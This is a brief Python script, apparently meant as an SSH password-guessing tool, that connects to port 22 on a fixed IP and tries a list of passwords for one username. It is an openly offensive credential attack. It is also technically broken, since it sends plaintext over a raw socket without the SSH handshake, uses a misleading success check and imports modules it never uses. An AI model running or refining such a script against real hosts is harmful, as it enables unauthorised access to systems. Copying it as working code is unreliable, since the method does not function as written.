import socket
import sys
from getpass import getpass

target_host = "192.168.1.1"  # Target IP address
target_port = 22  # Target port (SSH)
username = "username"
password_list = ["password1", "password2", "password3"]  # List of passwords to try

for password in password_list:
    try:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((target_host, target_port))
        client.recv(1024)
        client.send(f"{username}\n".encode())
        client.recv(1024)
        client.send(f"{password}\n".encode())
        response = client.recv(1024).decode()

        if "Permission denied" not in response:
            print(f"Successful login: {username}:{password}")
            break
        else:
            print(f"Login failed: {username}:{password}")

    except Exception as e:
        print(f"Error: {e}")

    finally:
        client.close()